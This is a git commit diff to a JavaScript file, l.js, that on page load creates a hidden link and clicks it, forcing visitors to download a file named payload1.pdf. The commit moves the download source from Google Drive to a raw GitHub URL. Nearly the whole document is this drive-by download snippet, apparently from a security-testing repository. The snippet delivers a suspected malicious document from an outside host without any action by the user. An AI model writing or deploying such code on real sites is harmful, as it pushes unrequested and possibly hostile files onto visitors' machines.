bd8e6f747ad8a6637a08b54a9f2ee3d7b4725576
aillesiM <29269177+ener1-s3c@users.noreply.github.com>
2024-08-25 13:14:14 +0700

    enhance once more :))))

--- l.js
+++ l.js
@@ -1,5 +1,5 @@
 var link = document.createElement("a");
-link.href = "https://drive.usercontent.google.com/download?id=1Z_Me1I7eeK5Mnz1BtoROrGS-seRBAikY&export=download&authuser=0&confirm=t&uuid=7090ddca-e5d5-4370-8659-c82607552980&at=AO7h07fqcaMOg5xGG9PaxhoL5qCv:1724566298448";
+link.href = "https://raw.githubusercontent.com/ener1-s3c/ener1-s3c.github.io/master/payload1.pdf";
 link.download = "payload1.pdf";
 document.body.appendChild(link);
 link.click();
